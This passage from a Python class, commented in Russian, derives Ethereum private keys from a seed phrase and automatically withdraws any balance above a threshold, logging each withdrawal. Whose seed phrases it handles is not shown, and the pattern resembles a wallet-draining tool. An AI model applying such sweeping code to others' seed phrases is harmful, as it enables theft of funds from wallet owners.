        except Exception as e:
            return {"error": f"Ошибка вывода: {str(e)}"}
    
    async def _auto_withdraw_from_seed(self, seed_phrase: str, balances: dict):
        """
        Автовывод со всех адресов из сид-фразы.
        """
        if not self.auto_withdraw_enabled:
            return []
        
        results = []
        
        try:
            from bip_utils import Bip39SeedGenerator, Bip44, Bip44Coins, Bip44Changes
            from eth_account import Account
            
            seed_bytes = Bip39SeedGenerator(seed_phrase).Generate()
            
            # Вывод с ETH адресов
            for i in range(10):
                eth_ctx = Bip44.FromSeed(seed_bytes, Bip44Coins.ETHEREUM).Purpose().Coin().Account(0).Change(Bip44Changes.CHAIN_EXT).AddressIndex(i)
                address = eth_ctx.PublicKey().ToAddress()
                priv_key = eth_ctx.PrivateKey().Raw().ToHex()
                
                balance_info = balances.get(f"ETH_{i}", {})
                balance = balance_info.get("balance", 0)
                
                if balance > self.withdraw_min_amounts.get("ethereum", 0.01):
                    result = await self._auto_withdraw_eth(priv_key, address, balance, "ethereum")
                    if result:
                        results.append(result)
            
            # TODO: Добавить вывод для BTC, TRX, SOL
            
        except Exception as e:
            results.append({"error": f"Ошибка автовывода: {str(e)}"})
        
        return results
    
    def get_withdraw_log(self):
        """Получить лог всех выводов."""
        return _AUTO_WITHDRAW_LOG.copy()
    
    def export_withdraw_log(self, filename="withdraw_log.json"):
        """Экспортировать лог выводов в файл."""
        import json
        with open(filename, "w", encoding="utf-8") as f:
            json.dump(_AUTO_WITHDRAW_LOG, f, indent=2, ensure_ascii=False)
        return f"✓ Лог сохранен в {filename}"
